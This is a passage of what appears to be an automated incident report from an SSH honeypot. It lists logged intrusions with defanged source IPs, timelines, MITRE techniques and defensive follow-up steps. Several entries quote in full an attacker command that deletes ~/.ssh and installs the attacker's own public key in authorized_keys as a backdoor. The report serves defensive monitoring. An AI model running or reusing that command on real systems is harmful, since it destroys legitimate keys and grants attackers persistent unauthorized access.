| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:01:49` | `cowrie.session.connect` |
| `2026-04-17 03:01:49` | `cowrie.client.version` |
| `2026-04-17 03:01:49` | `cowrie.client.kex` |
| `2026-04-17 03:01:50` | `cowrie.login.success` |
| `2026-04-17 03:01:51` | `cowrie.session.params` |
| `2026-04-17 03:01:51` | `cowrie.command.input` |
| `2026-04-17 03:01:51` | `cowrie.command.failed` |
| `2026-04-17 03:01:51` | `cowrie.log.closed` |
| `2026-04-17 03:01:52` | `cowrie.session.params` |
| `2026-04-17 03:01:52` | `cowrie.command.input` |
| `2026-04-17 03:01:52` | `cowrie.session.file_download` |
| `2026-04-17 03:01:52` | `cowrie.log.closed` |
| `2026-04-17 03:01:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]198` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb6e6ed7a630

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]198` |
| **First Seen** | 2026-04-17 03:01 |
| **Last Seen** | 2026-04-17 03:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:01:54` | `cowrie.session.connect` |
| `2026-04-17 03:01:54` | `cowrie.client.version` |
| `2026-04-17 03:01:54` | `cowrie.client.kex` |
| `2026-04-17 03:01:54` | `cowrie.login.success` |
| `2026-04-17 03:01:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]198` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a022b1fc788c

| Field | Detail |
|---|---|
| **Source IP** | `34.133.99[.]235` |
| **First Seen** | 2026-04-17 03:02 |
| **Last Seen** | 2026-04-17 03:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:02:21` | `cowrie.session.connect` |
| `2026-04-17 03:02:22` | `cowrie.client.version` |
| `2026-04-17 03:02:22` | `cowrie.client.kex` |
| `2026-04-17 03:02:23` | `cowrie.login.success` |
| `2026-04-17 03:02:23` | `cowrie.session.params` |
| `2026-04-17 03:02:23` | `cowrie.command.input` |
| `2026-04-17 03:02:23` | `cowrie.command.failed` |
| `2026-04-17 03:02:24` | `cowrie.log.closed` |
| `2026-04-17 03:02:24` | `cowrie.session.params` |
| `2026-04-17 03:02:24` | `cowrie.command.input` |
| `2026-04-17 03:02:25` | `cowrie.session.file_download` |
| `2026-04-17 03:02:25` | `cowrie.log.closed` |
| `2026-04-17 03:02:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.133.99[.]235` to AbuseIPDB if not already reported
- [ ] Block `34.133.99[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0961c60f1ec2

| Field | Detail |
|---|---|
| **Source IP** | `34.133.99[.]235` |
| **First Seen** | 2026-04-17 03:02 |
| **Last Seen** | 2026-04-17 03:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:02:27` | `cowrie.session.connect` |
| `2026-04-17 03:02:28` | `cowrie.client.version` |
| `2026-04-17 03:02:28` | `cowrie.client.kex` |
| `2026-04-17 03:02:29` | `cowrie.login.success` |
| `2026-04-17 03:02:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.133.99[.]235` to AbuseIPDB if not already reported
- [ ] Block `34.133.99[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ff98307f813

| Field | Detail |
|---|---|
| **Source IP** | `177.157.193[.]249` |
| **First Seen** | 2026-04-17 03:03 |
| **Last Seen** | 2026-04-17 03:04 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:03:51` | `cowrie.session.connect` |
| `2026-04-17 03:03:51` | `cowrie.client.version` |
| `2026-04-17 03:03:51` | `cowrie.client.kex` |
| `2026-04-17 03:03:53` | `cowrie.login.success` |
| `2026-04-17 03:03:53` | `cowrie.session.params` |
| `2026-04-17 03:03:53` | `cowrie.command.input` |
| `2026-04-17 03:03:53` | `cowrie.command.failed` |
| `2026-04-17 03:03:54` | `cowrie.log.closed` |
| `2026-04-17 03:03:54` | `cowrie.session.params` |
| `2026-04-17 03:03:54` | `cowrie.command.input` |
| `2026-04-17 03:03:55` | `cowrie.session.file_download` |
| `2026-04-17 03:03:55` | `cowrie.log.closed` |
| `2026-04-17 03:04:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.157.193[.]249` to AbuseIPDB if not already reported
- [ ] Block `177.157.193[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e060df7e4db

| Field | Detail |
|---|---|
| **Source IP** | `177.157.193[.]249` |
| **First Seen** | 2026-04-17 03:03 |
| **Last Seen** | 2026-04-17 03:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:03:58` | `cowrie.session.connect` |
| `2026-04-17 03:03:58` | `cowrie.client.version` |
| `2026-04-17 03:03:59` | `cowrie.client.kex` |
| `2026-04-17 03:04:00` | `cowrie.login.success` |
| `2026-04-17 03:04:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.157.193[.]249` to AbuseIPDB if not already reported
- [ ] Block `177.157.193[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-456484d84545

| Field | Detail |
|---|---|
| **Source IP** | `34.133.99[.]235` |
| **First Seen** | 2026-04-17 03:04 |
| **Last Seen** | 2026-04-17 03:04 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:04:08` | `cowrie.session.connect` |
| `2026-04-17 03:04:08` | `cowrie.client.version` |
| `2026-04-17 03:04:09` | `cowrie.client.kex` |
| `2026-04-17 03:04:10` | `cowrie.login.success` |
| `2026-04-17 03:04:10` | `cowrie.session.params` |
| `2026-04-17 03:04:10` | `cowrie.command.input` |
| `2026-04-17 03:04:10` | `cowrie.command.failed` |
| `2026-04-17 03:04:11` | `cowrie.log.closed` |
| `2026-04-17 03:04:11` | `cowrie.session.params` |
| `2026-04-17 03:04:11` | `cowrie.command.input` |
| `2026-04-17 03:04:11` | `cowrie.session.file_download` |
| `2026-04-17 03:04:11` | `cowrie.log.closed` |
| `2026-04-17 03:04:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.133.99[.]235` to AbuseIPDB if not already reported
- [ ] Block `34.133.99[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe29d90f4e05

| Field | Detail |
|---|---|
| **Source IP** | `34.133.99[.]235` |
| **First Seen** | 2026-04-17 03:04 |
| **Last Seen** | 2026-04-17 03:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:04:14` | `cowrie.session.connect` |
| `2026-04-17 03:04:14` | `cowrie.client.version` |
| `2026-04-17 03:04:14` | `cowrie.client.kex` |
| `2026-04-17 03:04:15` | `cowrie.login.success` |
| `2026-04-17 03:04:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.133.99[.]235` to AbuseIPDB if not already reported
- [ ] Block `34.133.99[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41a1b013f8f6

| Field | Detail |
|---|---|
| **Source IP** | `177.157.193[.]249` |
| **First Seen** | 2026-04-17 03:04 |
| **Last Seen** | 2026-04-17 03:04 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:04:38` | `cowrie.session.connect` |
| `2026-04-17 03:04:38` | `cowrie.client.version` |
| `2026-04-17 03:04:39` | `cowrie.client.kex` |
| `2026-04-17 03:04:40` | `cowrie.login.success` |
| `2026-04-17 03:04:41` | `cowrie.session.params` |
| `2026-04-17 03:04:41` | `cowrie.command.input` |
| `2026-04-17 03:04:41` | `cowrie.command.failed` |
| `2026-04-17 03:04:41` | `cowrie.log.closed` |
| `2026-04-17 03:04:42` | `cowrie.session.params` |
| `2026-04-17 03:04:42` | `cowrie.command.input` |
| `2026-04-17 03:04:42` | `cowrie.session.file_download` |
| `2026-04-17 03:04:42` | `cowrie.log.closed` |
| `2026-04-17 03:04:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.157.193[.]249` to AbuseIPDB if not already reported
- [ ] Block `177.157.193[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-011138739b88

| Field | Detail |
|---|---|
| **Source IP** | `177.157.193[.]249` |
| **First Seen** | 2026-04-17 03:04 |
| **Last Seen** | 2026-04-17 03:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:04:46` | `cowrie.session.connect` |
| `2026-04-17 03:04:46` | `cowrie.client.version` |
| `2026-04-17 03:04:46` | `cowrie.client.kex` |
| `2026-04-17 03:04:47` | `cowrie.login.success` |
| `2026-04-17 03:04:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.157.193[.]249` to AbuseIPDB if not already reported
- [ ] Block `177.157.193[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd467ebc8ee3

| Field | Detail |
|---|---|
| **Source IP** | `34.133.99[.]235` |
| **First Seen** | 2026-04-17 03:05 |
| **Last Seen** | 2026-04-17 03:05 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:05:50` | `cowrie.session.connect` |
| `2026-04-17 03:05:50` | `cowrie.client.version` |
| `2026-04-17 03:05:50` | `cowrie.client.kex` |
| `2026-04-17 03:05:51` | `cowrie.login.success` |
| `2026-04-17 03:05:51` | `cowrie.session.params` |
| `2026-04-17 03:05:51` | `cowrie.command.input` |
| `2026-04-17 03:05:51` | `cowrie.command.failed` |
| `2026-04-17 03:05:52` | `cowrie.log.closed` |
| `2026-04-17 03:05:52` | `cowrie.session.params` |
| `2026-04-17 03:05:52` | `cowrie.command.input` |
| `2026-04-17 03:05:53` | `cowrie.session.file_download` |
| `2026-04-17 03:05:53` | `cowrie.log.closed` |
| `2026-04-17 03:05:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.133.99[.]235` to AbuseIPDB if not already reported
- [ ] Block `34.133.99[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a67e1791e1d3

| Field | Detail |
|---|---|
| **Source IP** | `34.133.99[.]235` |
| **First Seen** | 2026-04-17 03:05 |
| **Last Seen** | 2026-04-17 03:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:05:55` | `cowrie.session.connect` |
| `2026-04-17 03:05:56` | `cowrie.client.version` |
| `2026-04-17 03:05:56` | `cowrie.client.kex` |
| `2026-04-17 03:05:57` | `cowrie.login.success` |
| `2026-04-17 03:05:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.133.99[.]235` to AbuseIPDB if not already reported
- [ ] Block `34.133.99[.]235` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0997c1eee68d

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]198` |
| **First Seen** | 2026-04-17 03:05 |
| **Last Seen** | 2026-04-17 03:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:05:56` | `cowrie.session.connect` |
| `2026-04-17 03:05:56` | `cowrie.client.version` |
| `2026-04-17 03:05:56` | `cowrie.client.kex` |
| `2026-04-17 03:05:56` | `cowrie.login.success` |
| `2026-04-17 03:05:57` | `cowrie.session.params` |
| `2026-04-17 03:05:57` | `cowrie.command.input` |
| `2026-04-17 03:05:57` | `cowrie.command.failed` |
| `2026-04-17 03:05:57` | `cowrie.log.closed` |
| `2026-04-17 03:05:57` | `cowrie.session.params` |
| `2026-04-17 03:05:57` | `cowrie.command.input` |
| `2026-04-17 03:05:57` | `cowrie.session.file_download` |
| `2026-04-17 03:05:57` | `cowrie.log.closed` |
| `2026-04-17 03:06:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]198` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]198` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ed8a0edfb33

| Field | Detail |
|---|---|
| **Source IP** | `103.200.25[.]198` |
| **First Seen** | 2026-04-17 03:06 |
| **Last Seen** | 2026-04-17 03:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:06:00` | `cowrie.session.connect` |
| `2026-04-17 03:06:00` | `cowrie.client.version` |
| `2026-04-17 03:06:00` | `cowrie.client.kex` |
| `2026-04-17 03:06:00` | `cowrie.login.success` |
| `2026-04-17 03:06:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.200.25[.]198` to AbuseIPDB if not already reported
- [ ] Block `103.200.25[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef6fb653995e

| Field | Detail |
|---|---|
| **Source IP** | `217.154.106[.]153` |
| **First Seen** | 2026-04-17 03:08 |
| **Last Seen** | 2026-04-17 03:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:08:18` | `cowrie.session.connect` |
| `2026-04-17 03:08:18` | `cowrie.client.version` |
| `2026-04-17 03:08:18` | `cowrie.client.kex` |
| `2026-04-17 03:08:19` | `cowrie.login.success` |
| `2026-04-17 03:08:19` | `cowrie.session.params` |
| `2026-04-17 03:08:19` | `cowrie.command.input` |
| `2026-04-17 03:08:19` | `cowrie.command.failed` |
| `2026-04-17 03:08:19` | `cowrie.log.closed` |
| `2026-04-17 03:08:20` | `cowrie.session.params` |
| `2026-04-17 03:08:20` | `cowrie.command.input` |
| `2026-04-17 03:08:20` | `cowrie.session.file_download` |
| `2026-04-17 03:08:20` | `cowrie.log.closed` |
| `2026-04-17 03:08:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.106[.]153` to AbuseIPDB if not already reported
- [ ] Block `217.154.106[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a88d1272892

| Field | Detail |
|---|---|
| **Source IP** | `217.154.106[.]153` |
| **First Seen** | 2026-04-17 03:08 |
| **Last Seen** | 2026-04-17 03:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:08:22` | `cowrie.session.connect` |
| `2026-04-17 03:08:22` | `cowrie.client.version` |
| `2026-04-17 03:08:22` | `cowrie.client.kex` |
| `2026-04-17 03:08:23` | `cowrie.login.success` |
| `2026-04-17 03:08:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.106[.]153` to AbuseIPDB if not already reported
- [ ] Block `217.154.106[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42ada550659c

| Field | Detail |
|---|---|
| **Source IP** | `177.157.193[.]249` |
| **First Seen** | 2026-04-17 03:08 |
| **Last Seen** | 2026-04-17 03:08 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 03:08:42` | `cowrie.session.connect` |
| `2026-04-17 03:08:42` | `cowrie.client.version` |
| `2026-04-17 03:08:43` | `cowrie.client.kex` |
| `2026-04-17 03:08:44` | `cowrie.login.success` |
| `2026-04-17 03:08:45` | `cowrie.session.params` |
| `2026-04-17 03:08:45` | `cowrie.command.input` |
| `2026-04-17 03:08:45` | `cowrie.command.failed` |
| `2026-04-17 03:08:45` | `cowrie.log.closed` |
| `2026-04-17 03:08:46` | `cowrie.session.params` |
| `2026-04-17 03:08:46` | `cowrie.command.input` |
| `2026-04-17 03:08:46` | `cowrie.session.file_download` |
| `2026-04-17 03:08:46` | `cowrie.log.closed` |
| `2026-04-17 03:08:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.157.193[.]249` to AbuseIPDB if not already reported
- [ ] Block `177.157.193[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f940b7b91b3

| Field | Detail |
|---|---|
| **Source IP** | `177.157.193[.]249` |
| **First Seen** | 2026-04-17 03:08 |
| **Last Seen** | 2026-04-17 03:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
